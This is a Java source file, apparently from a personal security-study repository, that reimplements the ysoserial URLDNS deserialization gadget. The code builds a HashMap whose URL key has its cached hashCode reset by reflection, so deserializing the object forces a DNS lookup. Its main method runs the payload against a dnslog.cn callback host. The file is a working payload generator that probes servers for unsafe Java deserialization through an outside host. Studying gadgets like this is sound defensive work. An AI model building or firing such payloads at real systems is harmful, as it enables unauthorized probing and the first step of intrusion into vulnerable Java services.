package com.pinger.javasec.ysoserial;

import com.pinger.javasec.util.SerialUtil;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

/**
 * @author : p1n93r
 * @date : 2021/3/31 11:28
 * URLDNS Gadget分析
 */
public class URLDNS {

    public static Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        // HashMap that will contain the URL
        HashMap ht = new HashMap();
        // URL to use as the Key
        URL u = new URL(null, url, handler);
        //URL u = new URL(null, url);
        //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        ht.put(u, url);

        // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        Class<? extends URL> clazz = u.getClass();
        Field hashCode = clazz.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.setInt(u,-1);

        return ht;
    }

    /**
     * 防止创建payload的时候发送DNS解析请求
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {
        Object object = getObject("http://aitco9.dnslog.cn");
        SerialUtil.runPayload(object);
    }
}
